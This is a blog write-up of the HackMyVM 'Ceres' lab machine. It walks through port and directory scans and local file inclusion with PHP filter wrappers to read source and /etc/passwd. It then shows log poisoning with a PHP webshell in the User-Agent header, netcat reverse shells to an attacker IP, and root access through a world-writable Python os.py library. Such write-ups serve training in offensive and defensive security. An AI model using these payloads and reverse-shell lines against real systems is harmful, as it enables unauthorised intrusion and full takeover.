---
layout: post
title:  "Case Study : Ceres / HMV"
---

- You’ll find this vm in HackMyVM `https://hackmyvm.eu/machines/machine.php?vm=Ceres`

- Difficulty : medium


## Nmap

```sh
┌──(alienum㉿kali)-[~]
└─$ nmap 10.0.2.198 -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-08 10:46 EET
Nmap scan report for 10.0.2.198 (10.0.2.198)
Host is up (0.00036s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## Gobuster 1
```sh
┌──(alienum㉿kali)-[~]
└─$ gobuster dir -k -u http://10.0.2.198  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.bak,.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.0.2.198
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,bak
[+] Timeout:        10s
===============================================================
2021/03/08 10:47:03 Starting gobuster
===============================================================
/robots.txt (Status: 200)
/planet (Status: 301)
/server-status (Status: 403)
```

## Gobuster 2 [ /planet ]
```sh
┌──(alienum㉿kali)-[~]
└─$ gobuster dir -k -u http://10.0.2.198/planet  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.bak,.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.0.2.198/planet
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,bak,txt
[+] Timeout:        10s
===============================================================
2021/03/08 10:49:22 Starting gobuster
===============================================================
/file.php (Status: 200)
/secret.php (Status: 200)
===============================================================
2021/03/08 10:52:59 Finished
===============================================================
```

## PHP wrapper
```
http://10.0.2.201/planet/file.php?file=php://filter/convert.base64-encode/resource=secret
```

#### Curl
```sh
┌──(alienum㉿kali)-[~/Desktop]
└─$ curl http://10.0.2.201/planet/file.php?file=php://filter/convert.base64-encode/resource=secret
PD9waHAKICAgIHN5c3RlbSgiaWQiKTsgLy8gICAgICAgICAgICAgICAgICAvTXlfSDFkZDNuX1MzY3IzdAo/Pgo=
```
#### Base64 decoder
```
PD9waHAKICAgIHN5c3RlbSgiaWQiKTsgLy8gICAgICAgICAgICAgICAgICAvTXlfSDFkZDNuX1MzY3IzdAo/Pgo=
```
```
<?php
    system("id"); //                  /My_H1dd3n_S3cr3t
?>
```
## Gobuster 3 [ /planet/My_H1dd3n_S3cr3t/ ]
```sh
┌──(alienum㉿kali)-[~/Desktop]
└─$ gobuster dir -k -u http://10.0.2.201/planet/My_H1dd3n_S3cr3t/  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x .php,.bak,.txt,.php.bak,.html
/index.html (Status: 200)
/file.php (Status: 200)
```
## PHP Wrapper 2
```
http://10.0.2.201/planet/My_H1dd3n_S3cr3t/file.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
```

#### Curl
```sh
┌──(alienum㉿kali)-[~/Desktop]
└─$ curl http://10.0.2.201/planet/My_H1dd3n_S3cr3t/file.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXRpbWVzeW5jOng6MTAxOjEwMjpzeXN0ZW1kIFRpbWUgU3luY2hyb25pemF0aW9uLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLW5ldHdvcms6eDoxMDI6MTAzOnN5c3RlbWQgTmV0d29yayBNYW5hZ2VtZW50LCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXJlc29sdmU6eDoxMDM6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCm1lc3NhZ2VidXM6eDoxMDQ6MTEwOjovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3NoZDp4OjEwNTo2NTUzNDo6L3J1bi9zc2hkOi91c3Ivc2Jpbi9ub2xvZ2luCmdpdXNlcHBlOng6MTAwMDoxMDAwOmdpdXNlcHBlLCwsOi9ob21lL2dpdXNlcHBlOi9iaW4vYmFzaApzeXN0ZW1kLWNvcmVkdW1wOng6OTk5Ojk5OTpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4K
```
###### Decoded /etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
giuseppe:x:1000:1000:giuseppe,,,:/home/giuseppe:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```
## Fuzzing for logs
#### Common log files
```
/apache/logs/error.log
/apache/logs/access.log
/apache/logs/error.log
/apache/logs/access.log
/apache/logs/error.log
/apache/logs/access.log
/etc/httpd/logs/acces_log
/etc/httpd/logs/acces.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/var/www/logs/access_log
/var/www/logs/access.log
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/var/log/apache/access_log
/var/log/apache2/access_log
/var/log/apache/access.log
/var/log/apache2/access.log
/var/log/access_log
/var/log/access.log
/var/www/logs/error_log
/var/www/logs/error.log
/usr/local/apache/logs/error_log
/usr/local/apache/logs/error.log
/var/log/apache/error_log
/var/log/apache2/error_log
/var/log/apache/error.log
/var/log/apache2/error.log
/var/log/error_log
/var/log/error.log
```
#### In action
```sh
┌──(alienum㉿kali)-[~/lfi-list]
└─$ wfuzz -w common-unix-httpd-log-locations.txt --hh 0 '10.0.2.201/planet/My_H1dd3n_S3cr3t/file.php?file=FUZZ'
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000019:   200        13 L     162 W      1886 Ch     "/var/log/apache2/access.log"
```
## LFI to RCE ( log poisoning through User-Agent)
#### BurpSuite -> Repeater
- Request
```
GET / HTTP/1.1
Host: 10.0.2.202
User-Agent: <?php system($_GET['cmd']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

####  Rce
```console
view-source:http://10.0.2.203/planet/My_H1dd3n_S3cr3t/file.php?file=/var/log/apache2/access.log&cmd=id
...
10.0.2.15 - - [10/Mar/2021:23:20:55 +0100] "GET / HTTP/1.1" 200 3343 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
```

## Reverse Shell
- Browser
```
view-source:http://10.0.2.203/planet/My_H1dd3n_S3cr3t/file.php?file=/var/log/apache2/access.log&cmd=nc%20-e%20/bin/sh%2010.0.2.15%205555
```
- Listener
```sh
┌──(alienum㉿kali)-[~]
└─$ nc -lvp 5555
listening on [any] 5555 ...
connect to [10.0.2.15] from 10.0.2.203 [10.0.2.203] 35210
/usr/bin/script -qc /bin/bash /dev/null
www-data@Ceres:/var/www/html/planet/My_H1dd3n_S3cr3t$ export TERM=xterm
export TERM=xterm
www-data@Ceres:/var/www/html/planet/My_H1dd3n_S3cr3t$ export HOME=/home
export HOME=/home
www-data@Ceres:/var/www/html/planet/My_H1dd3n_S3cr3t$ cd
cd
www-data@Ceres:~$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@Ceres:~$
```

## User
```sh
www-data@Ceres:~$ sudo -l
sudo -l
Matching Defaults entries for www-data on Ceres:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on Ceres:
    (giuseppe) NOPASSWD: /usr/bin/python
www-data@Ceres:~$ sudo -u giuseppe /usr/bin/python -c 'import os; os.system("/bin/sh")'
$ id
id
uid=1000(giuseppe) gid=1000(giuseppe) groups=1000(giuseppe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
$ /usr/bin/script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null
giuseppe@Ceres:/home$ cd
cd
giuseppe@Ceres:~$ ls
ls
user.txt
giuseppe@Ceres:~$
```
## Root - pspy64
```sh
2021/03/11 00:03:01 CMD: UID=0    PID=9980   | /bin/sh -c /opt/important.py
2021/03/11 00:03:01 CMD: UID=0    PID=9981   | /usr/bin/python /opt/important.py
```
#### Cat important.py
```sh
giuseppe@Ceres:/opt$ cat important.py
cat important.py
#!/usr/bin/python

import os

#a = "nananananananananananananananananannanana"
#b = "lahlahlahlahlahlahlahlahlahlahlahlhalhall"
#c = "PythonLoverPythonLoverPythonLoverPythonLo"
#d = "FuckMyVMFuckMyVMFuckMyVMFuckMyVMFuckMyVMF"
#e = "nahnahnahlalalanahnahnahnahanhahnahhaahaa"
#f = "rootrootrootrootrootrootrootrootrootrootr"


#command1 = "/usr/bin/chmod +s /bin/bash"
#command2 = "/bin/bash -p"
#command3 = "/usr/bin/whoami"


#os.system(command1)
#os.system(command2)
#os.system(command3)


giuseppe@Ceres:/opt$
```

#### Run - LinuxPrivChecker.py
```
[+] World Writable Files
...
-rwxrwxrwx 1 root root 25911 Mar  7 15:48 /usr/lib/python2.7/os.py
...
```
## Python Library Hijacking
- Edit os.py
- Explanation

1. The /opt/important.py import the /usr/lib/python2.7/os.py library
2. The root user automatically call the /opt/important.py periodically
3. The /usr/lib/python2.7/os.py is world writable
4. Edit the /usr/lib/python2.7/os.py with the reverse shell
5. Set up the listener
6. Wait for root to call the /opt/important.py

```
echo "import subprocess;subprocess.call(['nc', '-e','/bin/sh','10.0.2.15','4444'], shell=False)" >> /usr/lib/python2.7/os.py
```
- In action
```sh
giuseppe@Ceres:~$ echo "import subprocess;subprocess.call(['nc', '-e','/bin/sh','10.0.2.15','4444'], shell=False)" >> /usr/lib/python2.7/os.py
```
- Listener
```sh
┌──(alienum㉿kali)-[~]
└─$ nc -lvp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from 10.0.2.206 [10.0.2.206] 58668
id
uid=0(root) gid=0(root) grupos=0(root)
export TERM=xterm
/usr/bin/script -qc /bin/bash /dev/null
root@Ceres:~# whoami
whoami
root
```
